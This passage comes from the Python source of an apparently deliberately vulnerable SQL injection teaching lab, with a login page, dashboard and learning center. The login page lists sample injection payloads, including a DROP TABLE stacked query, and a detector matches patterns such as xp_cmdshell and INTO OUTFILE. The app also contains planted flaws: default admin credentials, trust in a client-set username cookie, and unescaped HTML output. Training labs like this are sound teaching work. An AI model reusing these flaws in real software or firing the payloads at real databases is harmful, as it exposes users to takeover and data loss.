            pass
    
    def get_user_products(self, user_id: int) -> List[Dict]:
        try:
            conn = self._get_db_connection()
            if not conn:
                return []
            cursor = conn.cursor()
            cursor.execute(
                "SELECT id, name, price, description, stock, category, created_at FROM products WHERE user_id = ?",
                (user_id,)
            )
            rows = cursor.fetchall()
            conn.close()
            return [
                {'id': r[0], 'name': r[1], 'price': r[2], 'description': r[3], 
                 'stock': r[4], 'category': r[5], 'created_at': r[6]}
                for r in rows
            ]
        except:
            return []
    
    def get_user_orders(self, user_id: int) -> List[Dict]:
        try:
            conn = self._get_db_connection()
            if not conn:
                return []
            cursor = conn.cursor()
            cursor.execute(
                "SELECT id, product_id, quantity, total, status, created_at FROM orders WHERE user_id = ?",
                (user_id,)
            )
            rows = cursor.fetchall()
            conn.close()
            return [
                {'id': r[0], 'product_id': r[1], 'quantity': r[2], 
                 'total': r[3], 'status': r[4], 'created_at': r[5]}
                for r in rows
            ]
        except:
            return []
    
    def get_all_products(self) -> List[Dict]:
        try:
            conn = self._get_db_connection()
            if not conn:
                return []
            cursor = conn.cursor()
            cursor.execute("""
                SELECT p.id, p.name, p.price, p.description, p.stock, p.category, u.username as owner
                FROM products p
                JOIN users u ON p.user_id = u.id
            """)
            rows = cursor.fetchall()
            conn.close()
            return [
                {'id': r[0], 'name': r[1], 'price': r[2], 'description': r[3], 
                 'stock': r[4], 'category': r[5], 'owner': r[6]}
                for r in rows
            ]
        except:
            return []
    
    def get_logs(self, limit: int = 50) -> List[Dict]:
        try:
            conn = self._get_db_connection()
            if not conn:
                return []
            cursor = conn.cursor()
            cursor.execute(
                "SELECT username, action, ip, timestamp FROM logs ORDER BY id DESC LIMIT ?",
                (limit,)
            )
            rows = cursor.fetchall()
            conn.close()
            return [
                {'username': r[0], 'action': r[1], 'ip': r[2], 'timestamp': r[3]}
                for r in rows
            ]
        except:
            return []
    
    def update_credentials(self, username: str, password: str) -> bool:
        try:
            conn = self._get_db_connection()
            if not conn:
                return False
            cursor = conn.cursor()
            cursor.execute(
                "UPDATE users SET password = ? WHERE username = ?",
                (password, username)
            )
            conn.commit()
            conn.close()
            self.current_credentials = {'username': username, 'password': password}
            return True
        except:
            return False
    
    def reset_database(self):
        try:
            if os.path.exists(self.db_path):
                os.remove(self.db_path)
            self._init_database()
            self.current_credentials = {'username': 'admin', 'password': 'admin123'}
            self.detected_techniques = set()
            self.injection_attempts = []
            if self.console:
                self.console.print("[green]Database reset to initial state[/green]")
        except Exception as e:
            if self.console:
                self.console.print(f"[red]Reset failed: {e}[/red]")
    
    def generate_pdf_notes(self) -> Optional[str]:
        """Generate PDF notes with DSTerminal v4.0.0.113 watermark"""
        return self.pdf_generator.generate_notes(include_techniques=True)
    
    def detect_technique(self, payload: str) -> str:
        """Detect which SQL injection technique is being used"""
        payload_upper = payload.upper()
        
        if 'UNION SELECT' in payload_upper:
            return 'union_based'
        elif 'AND SLEEP(' in payload_upper or 'WAITFOR DELAY' in payload_upper:
            return 'time_based'
        elif 'BENCHMARK(' in payload_upper:
            return 'time_based'
        elif 'CONVERT(INT,' in payload_upper or 'CAST((' in payload_upper:
            return 'error_based'
        elif 'DROP TABLE' in payload_upper or 'DELETE FROM' in payload_upper:
            return 'stacked_queries'
        elif 'UPDATE ' in payload_upper and 'SET' in payload_upper:
            return 'stacked_queries'
        elif 'INSERT INTO' in payload_upper:
            return 'stacked_queries'
        elif 'CREATE TABLE' in payload_upper or 'ALTER TABLE' in payload_upper:
            return 'stacked_queries'
        elif 'TRUNCATE TABLE' in payload_upper:
            return 'stacked_queries'
        elif 'EXEC XP_CMDSHELL' in payload_upper:
            return 'out_of_band'
        elif 'INTO OUTFILE' in payload_upper or 'INTO DUMPFILE' in payload_upper:
            return 'out_of_band'
        elif ' AND ' in payload_upper and ('1=1' in payload or '1=2' in payload):
            return 'boolean_based'
        elif 'OR ' in payload_upper and ('=' in payload or "'" in payload):
            return 'basic'
        elif 'AND ' in payload_upper and '=' in payload:
            return 'boolean_based'
        else:
            return 'basic'


# ============================================================
# HTTP REQUEST HANDLER
# ============================================================

class LabHTTPHandler(BaseHTTPRequestHandler):
    """HTTP handler for the SQL Injection Learning Lab"""
    
    lab_instance = None
    
    def log_message(self, format, *args):
        pass
    
    def do_GET(self):
        try:
            parsed = urlparse(self.path)
            path = parsed.path
            query_params = parse_qs(parsed.query)
            
            if path == '/' or path == '/login':
                self._serve_login_form()
            elif path == '/dashboard':
                self._serve_dashboard(query_params)
            elif path == '/logout':
                self._serve_logout()
            elif path == '/products':
                self._serve_products(query_params)
            elif path == '/users':
                self._serve_users(query_params)
            elif path == '/logs':
                self._serve_logs()
            elif path == '/styles.css':
                self._serve_css()
            elif path == '/reset':
                self._serve_reset()
            elif path == '/all-products':
                self._serve_all_products()
            elif path == '/toggle-learning':
                self._toggle_learning()
            elif path == '/injection-history':
                self._serve_injection_history()
            elif path == '/techniques':
                self._serve_techniques()
            elif path == '/download-pdf':
                self._serve_pdf_download()
            elif path == '/secure_login':
                self._handle_secure_login(query_params)
            else:
                self._send_error(404, "Page not found")
        except Exception as e:
            self._send_error(500, f"Server error: {str(e)}")

    def do_POST(self):
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8')
            params = parse_qs(post_data)
            
            parsed = urlparse(self.path)
            path = parsed.path
            
            if path == '/login':
                self._handle_login(params)
            elif path == '/update_credentials':
                self._handle_update_credentials(params)
            elif path == '/secure_login':
                self._handle_secure_login(params)
            elif path == '/test_injection':
                self._handle_test_injection(params)
            else:
                self._send_error(404, "Page not found")
        except Exception as e:
            self._send_error(500, f"Server error: {str(e)}")
            
    def _send_html(self, html: str, status: int = 200):
        try:
            self.send_response(status)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.end_headers()
            self.wfile.write(html.encode('utf-8'))
        except:
            pass
    
    def _send_error(self, code: int, message: str):
        html = f"""
        <html><body style="font-family: Arial; background: #0d1117; color: #c9d1d9; padding: 40px;">
            <h1 style="color: #ff5555;">Error {code}</h1>
            <p>{message}</p>
            <a href="/login" style="color: #00ffff;">Go to Login</a>
        </body></html>
        """
        self._send_html(html, code)
    
    def _serve_pdf_download(self):
        """Serve PDF download"""
        lab = self.lab_instance
        if not lab:
            self._send_error(500, "Lab not initialized")
            return
        
        pdf_path = lab.generate_pdf_notes()
        
        if pdf_path and os.path.exists(pdf_path):
            try:
                with open(pdf_path, 'rb') as f:
                    content = f.read()
                
                self.send_response(200)
                self.send_header('Content-Type', 'application/pdf')
                self.send_header('Content-Disposition', f'attachment; filename="sql_injection_notes_{datetime.now().strftime("%Y%m%d")}.pdf"')
                self.send_header('Content-Length', str(len(content)))
                self.end_headers()
                self.wfile.write(content)
            except Exception as e:
                self._send_error(500, f"Error serving PDF: {e}")
        else:
            self._send_error(500, "PDF generation failed. Please check that ReportLab is installed.")
    
    def _toggle_learning(self):
        lab = self.lab_instance
        if lab:
            lab.toggle_learning()
            self.send_response(302)
            self.send_header('Location', '/login')
            self.end_headers()
        else:
            self._send_error(500, "Lab not initialized")
    
    def _get_techniques_html(self) -> str:
        html = """
        <div class="techniques-grid">
        """
        
        for tech_id, tech_data in SQL_INJECTION_TECHNIQUES.items():
            html += f"""
            <div class="technique-card">
                <div class="technique-header">
                    <h4>{tech_data['name']}</h4>
                    <span class="tech-badge">{len(tech_data['payloads'])} payloads</span>
                </div>
                <div class="technique-body">
                    <p>{tech_data['description']}</p>
                    <div class="tech-example">
                        <code>{tech_data['example']}</code>
                    </div>
                    <details class="tech-details">
                        <summary>How it works</summary>
                        <p>{tech_data['explanation']}</p>
                    </details>
                    <div class="tech-payloads">
                        <h5>Payloads:</h5>
                        <ul>
            """
            for payload in tech_data['payloads'][:5]:
                html += f"<li><code class='payload-code'>{payload}</code></li>"
            if len(tech_data['payloads']) > 5:
                html += f"<li class='more-payloads'>... and {len(tech_data['payloads']) - 5} more</li>"
            html += """
                        </ul>
                    </div>
                    <button onclick="testPayload('""" + tech_id + """', '""" + tech_data['example'].replace("'", "\\'") + """')" class="test-btn">
                        Test This Payload
                    </button>
                </div>
            </div>
            """
        
        html += """
        </div>
        <script>
        function testPayload(technique, payload) {
            fetch('/test_injection', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'technique=' + encodeURIComponent(technique) + '&payload=' + encodeURIComponent(payload)
            })
            .then(response => response.text())
            .then(html => {
                const modal = document.createElement('div');
                modal.className = 'modal-overlay';
                modal.innerHTML = `
                    <div class="modal-content">
                        <div class="modal-header">
                            <h2>Injection Test Result</h2>
                            <button onclick="this.closest('.modal-overlay').remove()">X</button>
                        </div>
                        <div class="modal-body">
                            ${html}
                        </div>
                    </div>
                `;
                document.body.appendChild(modal);
            });
        }
        </script>
        """
        return html
    
    def _get_learning_content(self, show: bool) -> str:
        if not show:
            return ""
        
        return f"""
        <div class="learning-panel active">
            <div class="learning-header">
                <h2>SQL Injection Learning Center</h2>
                <div style="display:flex;gap:10px;align-items:center;">
                    <button onclick="location.href='/download-pdf'" class="download-pdf-btn">
                        Download PDF Notes
                    </button>
                    <button onclick="location.href='/toggle-learning'" class="close-learning">X</button>
                </div>
            </div>
            
            <div class="learning-tabs">
                <button class="tab-btn active" onclick="showTab('basics')">Basics</button>
                <button class="tab-btn" onclick="showTab('techniques')">Techniques</button>
                <button class="tab-btn" onclick="showTab('history')">History</button>
                <button class="tab-btn" onclick="showTab('prevention')">Prevention</button>
            </div>
            
            <div id="tab-basics" class="tab-content active">
                <div class="learning-section">
                    <h3>What is SQL Injection?</h3>
                    <p>SQL Injection is a code injection technique that exploits vulnerabilities in web applications. It occurs when user input is not properly sanitized and is passed directly to the database query.</p>
                    
                    <div class="example-box">
                        <h4>Vulnerable Code Example:</h4>
                        <code>query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"</code>
                        <p class="explanation">This allows attackers to inject malicious SQL code by entering special characters.</p>
                    </div>
                </div>
                
                <div class="learning-section">
                    <h3>How SQL Injection Works</h3>
                    <div class="step-list">
                        <div class="step">
                            <span class="step-num">1</span>
                            <span class="step-text">Attacker enters malicious input: <code>' OR '1'='1' --</code></span>
                        </div>
                        <div class="step">
                            <span class="step-num">2</span>
                            <span class="step-text">Query becomes: <code>SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = ''</code></span>
                        </div>
                        <div class="step">
                            <span class="step-num">3</span>
                            <span class="step-text">The OR condition is always TRUE, so it returns all users</span>
                        </div>
                        <div class="step">
                            <span class="step-num">4</span>
                            <span class="step-text">The -- comments out the password check</span>
                        </div>
                        <div class="step">
                            <span class="step-num">5</span>
                            <span class="step-text">Attacker is logged in as the first user (admin)</span>
                        </div>
                    </div>
                </div>
                
                <div class="learning-section">
                    <h3>Download Complete Notes</h3>
                    <p>Get a comprehensive PDF guide covering all SQL injection techniques, prevention methods, and hands-on exercises.</p>
                    <button onclick="location.href='/download-pdf'" class="download-btn" style="margin-top:10px;padding:10px 30px;background:linear-gradient(135deg,#00ffff,#0088ff);color:#0d1117;border:none;border-radius:10px;font-size:16px;font-weight:bold;cursor:pointer;width:auto;">
                        Download PDF Notes
                    </button>
                </div>
            </div>
            
            <div id="tab-techniques" class="tab-content">
                {self._get_techniques_html()}
            </div>
            
            <div id="tab-history" class="tab-content">
                <div class="learning-section">
                    <h3>Injection Attempt History</h3>
                    <div id="injection-history-container">
                        {self._get_injection_history_html()}
                    </div>
                </div>
            </div>
            
            <div id="tab-prevention" class="tab-content">
                <div class="learning-section">
                    <h3>How to Prevent SQL Injection</h3>
                    
                    <div class="prevention-list">
                        <div class="prevention-item">
                            <span class="prevention-icon">[+]</span>
                            <div class="prevention-text">
                                <h4>Use Parameterized Queries</h4>
                                <p>Always use prepared statements with parameters. This separates SQL code from data.</p>
                                <code>cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))</code>
                            </div>
                        </div>
                        <div class="prevention-item">
                            <span class="prevention-icon">[+]</span>
                            <div class="prevention-text">
                                <h4>Input Validation</h4>
                                <p>Validate and sanitize all user inputs. Use allowlists for expected values.</p>
                            </div>
                        </div>
                        <div class="prevention-item">
                            <span class="prevention-icon">[+]</span>
                            <div class="prevention-text">
                                <h4>Least Privilege Principle</h4>
                                <p>Database accounts should have minimal privileges needed for the application.</p>
                            </div>
                        </div>
                        <div class="prevention-item">
                            <span class="prevention-icon">[+]</span>
                            <div class="prevention-text">
                                <h4>Use Secure Mode</h4>
                                <p>Toggle the "Secure Mode" button in the dashboard to see parameterized queries in action!</p>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="learning-section">
                    <h3>Download Complete Prevention Guide</h3>
                    <p>Our comprehensive PDF includes detailed prevention strategies, secure coding examples, and best practices.</p>
                    <button onclick="location.href='/download-pdf'" class="download-btn" style="margin-top:10px;padding:10px 30px;background:linear-gradient(135deg,#00ff88,#00cc66);color:#0d1117;border:none;border-radius:10px;font-size:16px;font-weight:bold;cursor:pointer;width:auto;">
                        Download PDF Guide
                    </button>
                </div>
            </div>
        </div>
        
        <style>
        .download-pdf-btn {{
            padding: 8px 20px;
            background: linear-gradient(135deg, #ff8800, #ff5500);
            color: #fff;
            border: none;
            border-radius: 20px;
            font-size: 13px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
        }}
        .download-pdf-btn:hover {{
            transform: scale(1.05);
            box-shadow: 0 0 20px rgba(255, 136, 0, 0.3);
        }}
        .download-btn {{
            transition: all 0.3s;
        }}
        .download-btn:hover {{
            transform: scale(1.05);
            box-shadow: 0 0 30px rgba(0, 255, 255, 0.2);
        }}
        .learning-tabs {{
            display: flex;
            gap: 10px;
            padding: 15px 20px;
            background: #0d1117;
            border-bottom: 1px solid #30363d;
            flex-wrap: wrap;
        }}
        .tab-btn {{
            padding: 8px 20px;
            background: transparent;
            color: #888;
            border: none;
            border-radius: 20px;
            cursor: pointer;
            transition: all 0.3s;
            font-size: 14px;
            width: auto;
        }}
        .tab-btn:hover {{
            background: #1a1a2e;
            color: #c9d1d9;
        }}
        .tab-btn.active {{
            background: #00ffff22;
            color: #00ffff;
            border: 1px solid #00ffff;
        }}
        .tab-content {{
            display: none;
            padding: 20px;
        }}
        .tab-content.active {{
            display: block;
        }}
        
        .techniques-grid {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
            gap: 20px;
        }}
        .technique-card {{
            background: #0d1117;
            border-radius: 10px;
            border: 1px solid #30363d;
            overflow: hidden;
            transition: all 0.3s;
        }}
        .technique-card:hover {{
            border-color: #00ffff;
            box-shadow: 0 0 20px rgba(0, 255, 255, 0.05);
        }}
        .technique-header {{
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px;
            background: #1a1a2e;
            border-bottom: 1px solid #30363d;
        }}
        .technique-header h4 {{
            color: #00ffff;
            margin: 0;
        }}
        .tech-badge {{
            background: #00ffff22;
            color: #00ffff;
            padding: 2px 10px;
            border-radius: 12px;
            font-size: 12px;
        }}
        .technique-body {{
            padding: 15px;
        }}
        .technique-body p {{
            color: #888;
            font-size: 14px;
            margin-bottom: 10px;
        }}
        .tech-example {{
            background: #1a1a2e;
            padding: 8px;
            border-radius: 5px;
            margin: 10px 0;
        }}
        .tech-example code {{
            color: #ffcc00;
            font-family: 'Consolas', monospace;
        }}
        .tech-details {{
            margin: 10px 0;
        }}
        .tech-details summary {{
            color: #00ffff;
            cursor: pointer;
            padding: 5px 0;
        }}
        .tech-details p {{
            color: #c9d1d9;
            padding: 10px;
            background: #1a1a2e;
            border-radius: 5px;
            margin-top: 5px;
            font-size: 13px;
        }}
        .tech-payloads {{
            margin-top: 10px;
        }}
        .tech-payloads h5 {{
            color: #ffcc00;
            margin-bottom: 5px;
        }}
        .tech-payloads ul {{
            list-style: none;
            padding: 0;
        }}
        .tech-payloads li {{
            padding: 4px 0;
            font-family: 'Consolas', monospace;
            font-size: 12px;
            color: #00ff88;
        }}
        .payload-code {{
            background: #0d1117;
            padding: 2px 6px;
            border-radius: 3px;
            font-size: 12px;
        }}
        .more-payloads {{
            color: #888 !important;
            font-style: italic;
        }}
        .test-btn {{
            margin-top: 10px;
            padding: 8px 16px;
            background: #00ffff;
            color: #0d1117;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.3s;
            width: auto;
            font-size: 13px;
        }}
        .test-btn:hover {{
            transform: scale(1.05);
            box-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
        }}
        
        .modal-overlay {{
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            animation: fadeIn 0.3s;
        }}
        .modal-content {{
            background: #161b22;
            border-radius: 15px;
            max-width: 600px;
            width: 90%;
            max-height: 80vh;
            overflow-y: auto;
            border: 1px solid #00ffff;
            animation: slideUp 0.3s;
        }}
        .modal-header {{
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px;
            border-bottom: 1px solid #30363d;
        }}
        .modal-header h2 {{
            color: #00ffff;
            margin: 0;
        }}
        .modal-header button {{
            background: none;
            border: none;
            color: #ff5555;
            font-size: 24px;
            cursor: pointer;
            width: auto;
            padding: 0 10px;
        }}
        .modal-body {{
            padding: 20px;
        }}
        
        .prevention-list {{
            margin: 10px 0;
        }}
        .prevention-item {{
            display: flex;
            align-items: flex-start;
            padding: 12px;
            background: #1a1a2e;
            border-radius: 8px;
            margin-bottom: 10px;
            border: 1px solid #00ff8844;
        }}
        .prevention-icon {{
            font-size: 24px;
            margin-right: 15px;
            flex-shrink: 0;
        }}
        .prevention-text h4 {{
            color: #00ff88;
            margin-bottom: 5px;
        }}
        .prevention-text p {{
            color: #888;
            font-size: 0.9em;
        }}
        .prevention-text code {{
            display: block;
            background: #0d1117;
            padding: 8px;
            border-radius: 5px;
            color: #00ff88;
            font-size: 0.85em;
            margin-top: 5px;
            font-family: 'Consolas', monospace;
        }}
        
        @keyframes fadeIn {{
            from {{ opacity: 0; }}
            to {{ opacity: 1; }}
        }}
        @keyframes slideUp {{
            from {{ transform: translateY(50px); opacity: 0; }}
            to {{ transform: translateY(0); opacity: 1; }}
        }}
        </style>
        
        <script>
        function showTab(tabId) {{
            document.querySelectorAll('.tab-content').forEach(tab => {{
                tab.classList.remove('active');
            }});
            document.querySelectorAll('.tab-btn').forEach(btn => {{
                btn.classList.remove('active');
            }});
            document.getElementById('tab-' + tabId).classList.add('active');
            document.querySelectorAll('.tab-btn').forEach(btn => {{
                if (btn.textContent.toLowerCase().includes(tabId.toLowerCase())) {{
                    btn.classList.add('active');
                }}
            }});
        }}
        </script>
        """
    
    def _get_injection_history_html(self) -> str:
        lab = self.lab_instance
        if not lab:
            return "<p>No injection history available</p>"
        
        attempts = lab.get_injection_attempts(20)
        if not attempts:
            return "<p>No injection attempts recorded yet. Try some SQL injection techniques!</p>"
        
        html = """
        <table class="injection-history-table">
            <tr>
                <th>Technique</th>
                <th>Payload</th>
                <th>User</th>
                <th>Success</th>
                <th>Time</th>
            </tr>
        """
        for attempt in attempts:
            success_class = "success-badge" if attempt['success'] else "fail-badge"
            success_text = "Yes" if attempt['success'] else "No"
            html += f"""
            <tr>
                <td><span class="tech-badge">{attempt['technique']}</span></td>
                <td><code class="payload-code">{attempt['payload'][:50]}</code></td>
                <td>{attempt['username']}</td>
                <td class="{success_class}">{success_text}</td>
                <td style="font-size:12px;color:#888;">{attempt['timestamp']}</td>
            </tr>
            """
        html += "</table>"
        return html
    
    def _serve_login_form(self, error: str = "", message: str = ""):
        lab = self.lab_instance
        users = lab.get_users() if lab else []
        show_learning = lab.show_learning if lab else False
        
        user_list_html = ""
        if users:
            user_list_html = """
            <div class="user-list-hint">
                <h4>Available Users</h4>
                <table class="user-hint-table">
                    <tr><th>Username</th><th>Role</th><th>Department</th></tr>
            """
            for user in users[:10]:
                user_list_html += f"""
                    <tr>
                        <td><span class="username">{user['username']}</span></td>
                        <td><span class="role">{user['role']}</span></td>
                        <td><span class="dept">{user['department']}</span></td>
                    </tr>
                """
            if len(users) > 10:
                user_list_html += f"<tr><td colspan='3' style='text-align:center;color:#888;'>... and {len(users) - 10} more users</td></tr>"
            user_list_html += """
                </table>
                <p class="small">Try SQL injection on any user account!</p>
            </div>
            """
        
        error_html = f'<p style="color: #ff5555; text-align: center;">{error}</p>' if error else ''
        message_html = f'<p style="color: #00ff88; text-align: center;">{message}</p>' if message else ''
        
        learning_content = self._get_learning_content(show_learning)
        learning_toggle = "Show Learning Center" if not show_learning else "Hide Learning Center"
        
        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>SQL Injection Learning Lab</title>
            <link rel="stylesheet" href="/styles.css">
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>SQL Injection Learning Lab</h1>
                    <p class="subtitle">DSTERMINAL Enterprise Edition - Complete SQL Injection Lab</p>
                    <div class="header-controls">
                        <button onclick="location.href='/toggle-learning'" class="learning-toggle-btn">
                            {learning_toggle}
                        </button>
                        <button onclick="location.href='/download-pdf'" class="pdf-download-btn">
                            Download PDF Notes
                        </button>
                    </div>
                </div>
                
                {learning_content}
                
                <div class="login-box">
                    <h2>Login</h2>
                    {error_html}
                    {message_html}
                    <p class="info">Try SQL injection techniques to bypass authentication!</p>
                    
                    <form method="POST" action="/login">
                        <div class="form-group">
                            <label>Username:</label>
                            <input type="text" name="username" placeholder="Enter username" required>
                        </div>
                        <div class="form-group">
                            <label>Password:</label>
                            <input type="password" name="password" placeholder="Enter password" required>
                        </div>
                        <button type="submit">Login</button>
                    </form>
                    
                    <div class="hint">
                        <p>Try these SQL injection techniques:</p>
                        <ul style="list-style:none;padding:0;margin-top:5px;">
                            <li>- <code>' OR '1'='1' --</code> (Basic bypass)</li>
                            <li>- <code>' UNION SELECT 1,2,3,4,5,6,7,8 --</code> (Union-based)</li>
                            <li>- <code>' AND SLEEP(5) --</code> (Time-based)</li>
                            <li>- <code>'; DROP TABLE users --</code> (Stacked queries)</li>
                        </ul>
                    </div>
                </div>
                
                {user_list_html}
                
                <div class="footer">
                    <p>Educational Use Only | DSTERMINAL Enterprise Edition</p>
                    <p style="font-size:0.7em;color:#444;margin-top:5px;">
                        For more info: <a href="mailto:starkec.team@outlook.com" style="color:#00ffff;">starkec.team@outlook.com</a> | 
                        <a href="mailto:info@starkteamsupport.mw" style="color:#00ffff;">info@starkteamsupport.mw</a>
                    </p>
                </div>
            </div>
        </body>
        </html>
        """
        self._send_html(html)
    
    def _serve_dashboard(self, params):
        cookies = self.headers.get('Cookie', '')
        if 'logged_in=1' not in cookies:
            self._send_error(401, "Please login first")
            return
        
        username = 'admin'
        for cookie in cookies.split(';'):
            if 'username=' in cookie:
                username = cookie.split('=')[1].strip()
                break
        
        lab = self.lab_instance
        user = lab.get_user_by_username(username) if lab else None
        
        if not user and lab:
            users = lab.get_users()
            if users:
                user = users[0]
                username = user['username']
        
        if not user:
            self._send_error(401, "User not found")
            return
        
        products = lab.get_user_products(user['id']) if lab else []
        orders = lab.get_user_orders(user['id']) if lab else []
        secure_mode = lab.secure_mode if lab else False
        
        total_orders = len(orders)
        total_spent = sum(o['total'] for o in orders) if orders else 0
        pending_orders = sum(1 for o in orders if o['status'] == 'pending')
        
        status_color = "#00ff88" if secure_mode else "#ff5555"
        status_text = "SECURE" if secure_mode else "VULNERABLE"
        status_message = "SQL injection is PREVENTED (parameterized queries)" if secure_mode else "SQL injection is POSSIBLE (vulnerable)"
        status_icon = "[+]" if secure_mode else "[!]"
        toggle_text = "Disable Secure Mode" if secure_mode else "Enable Secure Mode"
        toggle_mode = "disable" if secure_mode else "enable"
        toggle_class = "btn-vulnerable" if secure_mode else "btn-secure"
        
        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>Dashboard - {username}</title>
            <link rel="stylesheet" href="/styles.css">
            <style>
                .status-banner {{
                    padding: 20px;
                    background: #161b22;
                    border-radius: 10px;
                    border: 2px solid {status_color};
                    text-align: center;
                    margin-bottom: 20px;
                }}
                .status-banner h3 {{
                    color: {status_color};
                    margin-bottom: 5px;
                }}
                .status-banner p {{
                    color: #c9d1d9;
                    margin: 5px 0;
                }}
                .status-banner .status-icon {{
                    font-size: 2em;
                    display: block;
                    margin-bottom: 10px;
                }}
                .btn-secure {{
                    background: #00ff88;
                    color: #0d1117;
                    border: none;
                    padding: 10px 20px;
                    border-radius: 5px;
                    cursor: pointer;
                    font-weight: bold;
                    font-size: 14px;
                    width: auto;
                    transition: all 0.3s;
                }}
                .btn-secure:hover {{
                    transform: scale(1.05);
                    box-shadow: 0 0 20px rgba(0, 255, 136, 0.3);
                }}
                .btn-vulnerable {{
                    background: #ff5555;
                    color: #fff;
                    border: none;
                    padding: 10px 20px;
                    border-radius: 5px;
                    cursor: pointer;
                    font-weight: bold;
                    font-size: 14px;
                    width: auto;
                    transition: all 0.3s;
                }}
                .btn-vulnerable:hover {{
                    transform: scale(1.05);
                    box-shadow: 0 0 20px rgba(255, 85, 85, 0.3);
                }}
                .query-display {{
                    margin-top: 15px;
                    padding: 15px;
                    background: #0d1117;
                    border-radius: 8px;
                    border: 1px solid #30363d;
                    text-align: left;
                }}
                .query-display code {{
                    display: block;
                    padding: 10px;
                    background: #1a1a2e;
                    border-radius: 5px;
                    color: #00ff88;
                    font-family: 'Consolas', monospace;
                    font-size: 13px;
                    overflow-x: auto;
                    margin-top: 5px;
                }}
                .query-label {{
                    color: #888;
                    font-size: 12px;
                    margin-bottom: 5px;
                }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>User Dashboard</h1>
                    <p class="subtitle">Welcome, <strong>{username}</strong>! ({user['role']})</p>
                    <p class="subtitle" style="font-size:0.8em;color:#666;">{user['email']} | {user['department']}</p>
                </div>
                
                <div class="nav-bar">
                    <a href="/dashboard" class="active">Dashboard</a>
                    <a href="/products">My Products</a>
                    <a href="/all-products">All Products</a>
                    <a href="/users">Users</a>
                    <a href="/logs">Logs</a>
                    <a href="/injection-history">Injection History</a>
                    <a href="/techniques">Techniques</a>
                    <a href="/logout">Logout</a>
                </div>
                
                <div class="dashboard-content">
                    <div class="status-banner">
                        <span class="status-icon">{status_icon}</span>
                        <h3>Security Status: {status_text}</h3>
                        <p>{status_message}</p>
                        <div style="margin-top: 15px;">
                            <button onclick="location.href='/secure_login?mode={toggle_mode}'" class="{toggle_class}">
                                {toggle_text}
                            </button>
                        </div>
                        <div class="query-display">
                            <div class="query-label">Current Query Method:</div>
                            <code>{'Parameterized Query (Secure)' if secure_mode else 'String Concatenation (Vulnerable)'}</code>
                            <div style="margin-top: 10px; font-size: 12px; color: #666;">
                                {'SQL injection is blocked' if secure_mode else 'SQL injection is possible'}
                            </div>
                        </div>
                    </div>
                    
                    <div class="stats-grid">
                        <div class="stat-card">
                            <h3>My Products</h3>
                            <div class="stat-number">{len(products)}</div>
                        </div>
                        <div class="stat-card">
                            <h3>Total Orders</h3>
                            <div class="stat-number">{total_orders}</div>
                        </div>
                        <div class="stat-card">
                            <h3>Total Spent</h3>
                            <div class="stat-number">${total_spent:.2f}</div>
                        </div>
                        <div class="stat-card">
                            <h3>Pending Orders</h3>
                            <div class="stat-number">{pending_orders}</div>
                        </div>
                    </div>
                    
                    <div class="admin-section">
                        <h3>Admin Controls</h3>
                        <p>Change admin credentials:</p>
                        <form method="POST" action="/update_credentials">
                            <div class="form-group inline">
                                <input type="text" name="new_username" placeholder="New admin username" required>
                                <input type="password" name="new_password" placeholder="New admin password" required>
                                <button type="submit">Update Admin Credentials</button>
                            </div>
                        </form>
                    </div>
                    
                    <div class="lab-section">
                        <h3>Lab Controls</h3>
                        <div class="lab-controls">
                            <button onclick="location.href='/secure_login?mode=enable'" class="btn-secure" style="{'display: none;' if secure_mode else ''}">Enable Secure Mode</button>
                            <button onclick="location.href='/secure_login?mode=disable'" class="btn-vulnerable" style="{'display: none;' if not secure_mode else ''}">Disable Secure Mode</button>
                            <button onclick="if(confirm('Reset database to initial state?')) location.href='/reset'" class="btn-reset">Reset Database</button>
                            <button onclick="location.href='/techniques'" class="btn-learning">View Techniques</button>
                            <button onclick="location.href='/download-pdf'" class="btn-pdf">Download PDF Notes</button>
                        </div>
                    </div>
                </div>
                
                <div class="footer">
                    <p>Educational Use Only | DSTERMINAL Enterprise Edition</p>
                    <p style="font-size:0.7em;color:#444;margin-top:5px;">
                        For more info: <a href="mailto:starkec.team@outlook.com" style="color:#00ffff;">starkec.team@outlook.com</a> | 
                        <a href="mailto:info@starkteamsupport.mw" style="color:#00ffff;">info@starkteamsupport.mw</a>
                    </p>
                </div>
            </div>
        </body>
        </html>
        """
        self._send_html(html)
        
    def _serve_products(self, params):
        cookies = self.headers.get('Cookie', '')
        if 'logged_in=1' not in cookies:
            self._send_error(401, "Please login first")
            return
        
        username = 'admin'
        for cookie in cookies.split(';'):
            if 'username=' in cookie:
                username = cookie.split('=')[1].strip()
                break
        
        lab = self.lab_instance
        user = lab.get_user_by_username(username) if lab else None
        
        if not user:
            self._send_error(401, "User not found")
            return
        
        products = lab.get_user_products(user['id']) if lab else []
        
        html = """
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>My Products - SQL Injection Lab</title>
            <link rel="stylesheet" href="/styles.css">
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>My Products</h1>
                    <p class="subtitle">Products owned by """ + username + """</p>
                </div>
                
                <div class="nav-bar">
                    <a href="/dashboard">Dashboard</a>
                    <a href="/products" class="active">My Products</a>
                    <a href="/all-products">All Products</a>
                    <a href="/users">Users</a>
                    <a href="/logs">Logs</a>
